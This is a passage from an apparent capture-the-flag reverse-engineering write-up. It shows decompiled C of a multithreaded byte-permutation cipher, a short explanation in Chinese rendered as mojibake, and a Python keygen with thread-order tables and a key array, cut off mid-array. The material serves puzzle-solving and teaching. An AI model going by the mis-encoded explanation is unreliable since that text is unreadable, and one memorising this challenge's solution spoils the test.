class="keyword">if</span> ( v19 == v17 )</span><br><span class="line">                &#123;</span><br><span class="line">                  v20 = <span class="number">0LL</span>;</span><br><span class="line">                  v17 = <span class="number">0LL</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                  v20 = v17 &lt;&lt; <span class="number">6</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                v21 = (a1[<span class="number">1</span>] + v18 + v20);</span><br><span class="line">                v22 = _InterlockedCompareExchange8(v21, v14, v12);</span><br><span class="line">                <span class="keyword">if</span> ( v12 == v22 )</span><br><span class="line">                  <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">                <span class="keyword">if</span> ( v14 == v22 )</span><br><span class="line">                &#123;</span><br><span class="line">                  v28 = v15;</span><br><span class="line">                  <span class="keyword">if</span> ( v14 == _InterlockedCompareExchange8(v21, v15, v14) )</span><br><span class="line">                    <span class="keyword">goto</span> LABEL_50;</span><br><span class="line">                &#125;</span><br><span class="line">                ++v17;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">LABEL_43:</span><br><span class="line">            <span class="keyword">if</span> ( v19 == v17 )</span><br><span class="line">            &#123;</span><br><span class="line">              v17 = <span class="number">0LL</span>;</span><br><span class="line">              v29 = (a1[<span class="number">1</span>] + v18);</span><br><span class="line">              <span class="keyword">if</span> ( v19 != <span class="number">1</span> )</span><br><span class="line">                <span class="keyword">goto</span> LABEL_45;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              v29 = (a1[<span class="number">1</span>] + v18 + (v17 &lt;&lt; <span class="number">6</span>));</span><br><span class="line">              <span class="keyword">if</span> ( v19 - <span class="number">1</span> != v17 )</span><br><span class="line">              &#123;</span><br><span class="line">LABEL_45:</span><br><span class="line">                v30 = _InterlockedCompareExchange8(v29, v14, v12);</span><br><span class="line">                <span class="keyword">if</span> ( v12 == v30 )</span><br><span class="line">                  <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">                <span class="keyword">if</span> ( v14 == v30 )</span><br><span class="line">                &#123;</span><br><span class="line">                  v28 = v15;</span><br><span class="line">                  <span class="keyword">if</span> ( v14 == _InterlockedCompareExchange8(v29, v15, v14) )</span><br><span class="line">                  &#123;</span><br><span class="line">LABEL_50:</span><br><span class="line">                    v17 &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">                    ++v18;</span><br><span class="line">                    <span class="keyword">if</span> ( v19 &lt;= <span class="number">1</span> )</span><br><span class="line">                      <span class="keyword">goto</span> LABEL_53;</span><br><span class="line">                    LOBYTE(v13) = v19;</span><br><span class="line">                    v16 = v19 + <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">goto</span> LABEL_42;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          v28 = v15;</span><br><span class="line">          <span class="keyword">if</span> ( v12 == _InterlockedCompareExchange8(v29, v15, v12) )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_50;</span><br><span class="line">LABEL_42:</span><br><span class="line">          ++v17;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_43;</span><br><span class="line">        &#125;</span><br><span class="line">        v28 = *v5 + <span class="number">2</span>;</span><br><span class="line">LABEL_53:</span><br><span class="line">        *a1 += a1[<span class="number">2</span>];</span><br><span class="line">        a1[<span class="number">2</span>] = <span class="number">0LL</span>;</span><br><span class="line">        *v5 = v28;</span><br><span class="line">        _InterlockedAdd(v6, <span class="number">1u</span>);</span><br><span class="line">        <span class="keyword">if</span> ( *v32 )</span><br><span class="line">          syscall(<span class="number">202LL</span>, v6, <span class="number">1LL</span>, <span class="number">0x7FFFFFFF</span>LL);</span><br><span class="line">LABEL_26:</span><br><span class="line">        _InterlockedAdd(v32, <span class="number">1u</span>);</span><br><span class="line">LABEL_27:</span><br><span class="line">        v23 = *v6;</span><br><span class="line">        v24 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ( v12 == *v5 )</span><br><span class="line">        &#123;</span><br><span class="line">          v25 = v24 + <span class="number">1</span>;</span><br><span class="line">          <span class="keyword">if</span> ( v24 &lt;= <span class="number">0xB</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            _mm_pause();</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            sched_yield();</span><br><span class="line">            <span class="keyword">if</span> ( v25 == <span class="number">16</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">if</span> ( syscall(<span class="number">202LL</span>, v6, <span class="number">0LL</span>, v23, <span class="number">0LL</span>) )</span><br><span class="line">              &#123;</span><br><span class="line">                v26 = *__errno_location();</span><br><span class="line">                <span class="keyword">if</span> ( v26 != <span class="number">11</span> &amp;&amp; v26 != <span class="number">4</span> )</span><br><span class="line">                  <span class="built_in">std</span>::__throw_system_error(v26);</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">if</span> ( v12 == *v5 )</span><br><span class="line">                <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          v24 = v25;</span><br><span class="line">        &#125;</span><br><span class="line">        _InterlockedSub(v32, <span class="number">1u</span>);</span><br><span class="line">        v27 = v36-- == <span class="number">1</span>;</span><br><span class="line">        index = <span class="number">7</span> * index % <span class="number">0x11</span>;</span><br><span class="line">        piece = *data_to_encrypt;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( !v27 );</span><br><span class="line">      base += <span class="number">16LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( data_to_encrypt[<span class="number">1</span>] - piece &gt; base );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å®é™…ä¸Šçš„åŠ å¯†é€»è¾‘éå¸¸çŸ­ å¤§éƒ¨åˆ†æ˜¯åœ¨é˜²æ­¢æ•°æ®ç«äº‰ åŠ å¯†é€»è¾‘æ˜¯é€šè¿‡ä¸€å¼ è¡¨æ ¹æ®å½“å‰çº¿ç¨‹çš„IDå¯¹è¾“å…¥çš„16è¿›åˆ¶1å­—èŠ‚æ•°æ®è¿›è¡ŒäºŒè¿›åˆ¶ä½æ›¿æ¢ çœ‹èµ·æ¥æ˜¯æ¯æ¬¡åŠ å¯†16å­—èŠ‚çš„æ•°æ®å— å®é™…ä¸Šæ¯åŠ å¯†1ä¸ªå­—èŠ‚å°±ä¼šè¿›å…¥çº¿ç¨‹è§„åˆ’ æ‰€ä»¥å½“ä½œæ¯ä¸ªå­—èŠ‚å•ç‹¬åŠ å¯† é€šè¿‡åŠ¨æ€è°ƒè¯•çŸ¥é“çº¿ç¨‹è§„åˆ’æ˜¯å½“å‰çº¿ç¨‹åŠ å¯†å®Œ1å­—èŠ‚çš„æ•°æ®åå¯åŠ¨çº¿ç¨‹<code>id</code>ä¸º<code>(å½“å‰id + 1) % 17</code>çš„çº¿ç¨‹ å†çœ‹åŠ å¯†é€»è¾‘ å½“å†æ¬¡è½®æ¢åˆ°ç›¸åŒçº¿ç¨‹æ—¶å°†è¦åŠ å¯†çš„ä¸‹ä¸€ä¸ªå­—èŠ‚çš„<code>index_new</code>å®šä¸º<code>7 * index_now % 0x11</code> è€Œæ¯ä¸ªçº¿ç¨‹åˆå§‹çš„<code>index</code>è®¾ä¸ºçº¿ç¨‹id çŸ¥é“äº†è¿™äº›å°±èƒ½å†™å‡ºkeygen:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å…ˆè®¡ç®—å‡ºåŠ å¯†çš„é¡ºåº å†é€†åºè§£å¯†</span></span><br><span class="line"><span class="comment"># calculate_process.py:</span></span><br><span class="line">threads = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    thread = []</span><br><span class="line">    base = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        now = i + <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">            thread.append(now + base)</span><br><span class="line">            now = (<span class="number">7</span> * now) % <span class="number">0x11</span></span><br><span class="line">        base += <span class="number">16</span></span><br><span class="line">    threads.append(thread)</span><br><span class="line"><span class="built_in">print</span>(threads)</span><br><span class="line"><span class="comment"># keygen.py:</span></span><br><span class="line">enc = <span class="string">&quot;75ac713a945e9f78f657b735b7e1913cdece53b8853f3a7daade83b319c49139f8f655b0b77b&quot;</span></span><br><span class="line">enc = [<span class="built_in">int</span>(enc[<span class="number">2</span> * i:<span class="number">2</span> * i + <span class="number">2</span>], <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc) // <span class="number">2</span>)]</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">len</span>(enc) % <span class="number">0x10</span>):</span><br><span class="line">    enc.append(<span class="number">0</span>)</span><br><span class="line">enc.append(<span class="number">0</span>)</span><br><span class="line">indexs = [[<span class="number">1</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">17</span>, <span class="number">23</span>, <span class="number">31</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">27</span>, <span class="number">25</span>, <span class="number">28</span>, <span class="number">32</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">30</span>, <span class="number">29</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">21</span>, <span class="number">33</span>, <span class="number">39</span>, <span class="number">47</span>, <span class="number">35</span>, <span class="number">36</span>, <span class="number">43</span>, <span class="number">41</span>, <span class="number">44</span>, <span class="number">48</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">46</span>, <span class="number">45</span>, <span class="number">38</span>, <span class="number">40</span>, <span class="number">37</span>], [<span class="number">2</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">10</span>, <span class="number">18</span>, <span class="number">30</span>, <span class="number">29</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">21</span>, <span class="number">17</span>, <span class="number">23</span>, <span class="number">31</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">27</span>, <span class="number">25</span>, <span class="number">28</span>, <span class="number">32</span>, <span class="number">26</span>, <span class="number">34</span>, <span class="number">46</span>, <span class="number">45</span>, <span class="number">38</span>, <span class="number">40</span>, <span class="number">37</span>, <span class="number">33</span>, <span class="number">39</span>, <span class="number">47</span>, <span class="number">35</span>, <span class="number">36</span>, <span class="number">43</span>, <span class="number">41</span>, <span class="number">44</span>, <span class="number">48</span>, <span class="number">42</span>], [<span class="number">3</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">27</span>, <span class="number">25</span>, <span class="number">28</span>, <span class="number">32</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">30</span>, <span class="number">29</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">21</span>, <span class="number">17</span>, <span class="number">23</span>, <span class="number">31</span>, <span class="number">35</span>, <span class="number">36</span>, <span class="number">43</span>, <span class="number">41</span>, <span class="number">44</span>, <span class="number">48</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">46</span>, <span class="number">45</span>, <span class="number">38</span>, <span class="number">40</span>, <span class="number">37</span>, <span class="number">33</span>, <span class="number">39</span>, <span class="number">47</span>], [<span class="number">4</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">20</span>, <span class="number">27</span>, <span class="number">25</span>, <span class="number">28</span>, <span class="number">32</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">30</span>, <span class="number">29</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">21</span>, <span class="number">17</span>, <span class="number">23</span>, <span class="number">31</span>, <span class="number">19</span>, <span class="number">36</span>, <span class="number">43</span>, <span class="number">41</span>, <span class="number">44</span>, <span class="number">48</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">46</span>, <span class="number">45</span>, <span class="number">38</span>, <span class="number">40</span>, <span class="number">37</span>, <span class="number">33</span>, <span class="number">39</span>, <span class="number">47</span>, <span class="number">35</span>], [<span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">21</span>, <span class="number">17</span>, <span class="number">23</span>, <span class="number">31</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">27</span>, <span class="number">25</span>, <span class="number">28</span>, <span class="number">32</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">30</span>, <span class="number">29</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">37</span>, <span class="number">33</span>, <span class="number">39</span>, <span class="number">47</span>, <span class="number">35</span>, <span class="number">36</span>, <span class="number">43</span>, <span class="number">41</span>, <span class="number">44</span>, <span class="number">48</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">46</span>, <span class="number">45</span>, <span class="number">38</span>, <span class="number">40</span>], [<span class="number">6</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">21</span>, <span class="number">17</span>, <span class="number">23</span>, <span class="number">31</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">27</span>, <span class="number">25</span>, <span class="number">28</span>, <span class="number">32</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">30</span>, <span class="number">29</span>, <span class="number">38</span>, <span class="number">40</span>, <span class="number">37</span>, <span class="number">33</span>, <span class="number">39</span>, <span class="number">47</span>, <span class="number">35</span>, <span class="number">36</span>, <span class="number">43</span>, <span class="number">41</span>, <span class="number">44</span>, <span class="number">48</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">46</span>, <span class="number">45</span>], [<span class="number">7</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">23</span>, <span class="number">31</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">27</span>, <span class="number">25</span>, <span class="number">28</span>, <span class="number">32</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">30</span>, <span class="number">29</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">21</span>, <span class="number">17</span>, <span class="number">39</span>, <span class="number">47</span>, <span class="number">35</span>, <span class="number">36</span>, <span class="number">43</span>, <span class="number">41</span>, <span class="number">44</span>, <span class="number">48</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">46</span>, <span class="number">45</span>, <span class="number">38</span>, <span class="number">40</span>, <span class="number">37</span>, <span class="number">33</span>], [<span class="number">8</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">24</span>, <span class="number">21</span>, <span class="number">17</span>, <span class="number">23</span>, <span class="number">31</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">27</span>, <span class="number">25</span>, <span class="number">28</span>, <span class="number">32</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">30</span>, <span class="number">29</span>, <span class="number">22</span>, <span class="number">40</span>, <span class="number">37</span>, <span class="number">33</span>, <span class="number">39</span>, <span class="number">47</span>, <span class="number">35</span>, <span class="number">36</span>, <span class="number">43</span>, <span class="number">41</span>, <span class="number">44</span>, <span class="number">48</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">46</span>, <span class="number">45</span>, <span class="number">38</span>], [<span class="number">9</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">25</span>, <span class="number">28</span>, <span class="number">32</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">30</span>, <span class="number">29</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">21</span>, <span class="number">17</span>, <span class="number">23</span>, <span class="number">31</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">27</span>, <span class="number">41</span>, <span class="number">44</span>, <span class="number">48</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">46</span>, <span class="number">45</span>, <span class="number">38</span>, <span class="number">40</span>, <span class="number">37</span>, <span class="number">33</span>, <span class="number">39</span>, <span class="number">47</span>, <span class="number">35</span>, <span class="number">36</span>, <span class="number">43</span>], [<span class="number">10</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">30</span>, <span class="number">29</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">21</span>, <span class="number">17</span>, <span class="number">23</span>, <span class="number">31</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">27</span>, <span class="number">25</span>, <span class="number">28</span>, <span class="number">32</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">46</span>, <span class="number">45</span>, <span class="number">38</span>, <span class="number">40</span>, <span class="number">37</span>, <span class="number">33</span>, <span class="number">39</span>, <span class="number">47</span>, <span class="number">35</span>, <span class="number">36</span>, <span class="number">43</span>, <span class="number">41</span>, <span class="number">44</span>, <span class="number">48</span>], [<span class="number">11</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">27</span>, <span class="number">25</span>, <span class="number">28</span>, <span class="number">32</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">30</span>, <span class="number">29</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">21</span>, <span class="number">17</span>, <span class="number">23</span>, <span class="number">31</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">43</span>, <span class="number">41</span>, <span class="number">44</span>, <span class="number">48</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">46</span>, <span class="number">45</span>, <span class="number">38</span>, <span class="number">40</span>, <span class="number">37</span>, <span class="number">33</span>, <span class="number">39</span>, <span class="number">47</span>, <span class="number">35</span>, <span class="number">36</span>], [<span class="number">12</span>, <span class="number">16</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">28</span>, <span class="number">32</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">30</span>, <span class="number">29</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">21</span>, <span class="number">17</span>, <span class="number">23</span>, <span class="number">31</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">27</span>, <span class="number">25</span>, <span class="number">44</span>, <span class="number">48</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">46</span>, <span class="number">45</span>, <span class="number">38</span>, <span class="number">40</span>, <span class="number">37</span>, <span class="number">33</span>, <span class="number">39</span>, <span class="number">47</span>, <span class="number">35</span>, <span class="number">36</span>, <span class="number">43</span>, <span class="number">41</span>], [<span class="number">13</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">29</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">21</span>, <span class="number">17</span>, <span class="number">23</span>, <span class="number">31</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">27</span>, <span class="number">25</span>, <span class="number">28</span>, <span class="number">32</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">30</span>, <span class="number">45</span>, <span class="number">38</span>, <span class="number">40</span>, <span class="number">37</span>, <span class="number">33</span>, <span class="number">39</span>, <span class="number">47</span>, <span class="number">35</span>, <span class="number">36</span>, <span class="number">43</span>, <span class="number">41</span>, <span class="number">44</span>, <span class="number">48</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">46</span>], [<span class="number">14</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">30</span>, <span class="number">29</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">21</span>, <span class="number">17</span>, <span class="number">23</span>, <span class="number">31</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">27</span>, <span class="number">25</span>, <span class="number">28</span>, <span class="number">32</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">46</span>, <span class="number">45</span>, <span class="number">38</span>, <span class="number">40</span>, <span class="number">37</span>, <span class="number">33</span>, <span class="number">39</span>, <span class="number">47</span>, <span class="number">35</span>, <span class="number">36</span>, <span class="number">43</span>, <span class="number">41</span>, <span class="number">44</span>, <span class="number">48</span>, <span class="number">42</span>, <span class="number">34</span>], [<span class="number">15</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">31</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">27</span>, <span class="number">25</span>, <span class="number">28</span>, <span class="number">32</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">30</span>, <span class="number">29</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">21</span>, <span class="number">17</span>, <span class="number">23</span>, <span class="number">47</span>, <span class="number">35</span>, <span class="number">36</span>, <span class="number">43</span>, <span class="number">41</span>, <span class="number">44</span>, <span class="number">48</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">46</span>, <span class="number">45</span>, <span class="number">38</span>, <span class="number">40</span>, <span class="number">37</span>, <span class="number">33</span>, <span class="number">39</span>], [<span class="number">16</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">32</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">30</span>, <span class="number">29</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">21</span>, <span class="number">17</span>, <span class="number">23</span>, <span class="number">31</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">27</span>, <span class="number">25</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">46</span>, <span class="number">45</span>, <span class="number">38</span>, <span class="number">40</span>, <span class="number">37</span>, <span class="number">33</span>, <span class="number">39</span>, <span class="number">47</span>, <span class="number">35</span>, <span class="number">36</span>, <span class="number">43</span>, <span class="number">41</span>, <span class="number">44</span>]]</span><br><span class="line">key = [</span><br><span class="line">  <span class="number">0x02</span>, <span class="number">0x08</span>, <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x05</span>, <span class="number">0x04</span>, <span class="number">0x07</span>, <span class="number">0x06</span>, <span class="number">0x01</span>, </span><br><span class="line">  <span class="number">0x04</span>, <span class="number">0x08</span>, <span class="number">0x05</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x07</span>, <span class="number">0x07</span>, <span class="number">0x08</span>, <span class="number">0x03</span>, <span class="number">0x05</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x04</span>, <span class="number">0x06</span>, <span class="number">0x04</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x06</span>, <span class="number">0x02</span>, <span class="number">0x08</span>, </span><br><span class="line">  <span class="number">0x05</span>, <span class="number">0x07</span>, <span class="number">0x07</span>, <span class="number">0x05</span>, <span class="number">0x08</span>, <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x03</span>, <span class="number">0x02</span>, </span><br><span class="line">  <span class="number">0x07</span>, <span class="number">0x04</span>, <span class="number">0x08</span>, <span class="number">0x05</span>, <span class="number">0x06</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x07</span>, <span class="number">0x06</span>, </span><br><span class="line">  <span class="number">0x04</span>, <span class="number">0x08</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x02</span>, <span class="number">0x05</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x08</span>, <span class="number">0x04</span>, </span><br><span class="line">  <span class="number">0x07</span>, <span class="number">0x02</span>, <span class="number">0x06</span>, <span class="number">0x05</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x08</span>, <span class="number">0x06</span>, <span class="number">0x02</span>, <span class="number">0x05</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x07</span>, <span class="number">0x08</span>, <span class="number">0x01</span>, <span class="number">0x06</span>, <span class="number">0x02</span>, <span class="number">0x07</span>, <span class="number">0x05</span>, <span class="number">0x04</span>, <span class="number">0x03</span>, </span><br><span class="line">  <span class="number">0x02</span>, <span class="number">0x07</span>, <span class="number">0x05</span>, <span class="number">0x08</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x03</span>, <span class="number">0x06</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, </span><br><span class="line">  <span class="number">0x02</span>, <span class="number">0x06</span>, <span class="number">0x05</span>, <span class="number">0x08</span>, <span class="number">0x07</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x03</span>, <span class="number">0x05</span>, </span><br><span class="line">  <span class="number">0x07</span>, <span class="number">0x06</span>, <span class="number">0x02</span>, <span class="number">0x08</span>, <span class="number">0x04</span>, <span class="number">0x07</span>, <span class="number">0x03</span>, <span class="number">0x06</span>, <span class="number">0x05</span>, <span class="number">0x01</span>, </span><br><span class="line">  <span class="number">0x08</span>, <span class="number">0x02</span>, <span class="number">0x06</span>, <span class="number">0x07</span>, <span class="number">0x04</span>, <span class="number">0x01</span>, <span class="number">0x05</span>, <span class="number">0x03</span>, <span class="number">0x02</span>, <span class="number">0x08</span>, </span><br><span class="line">  <span 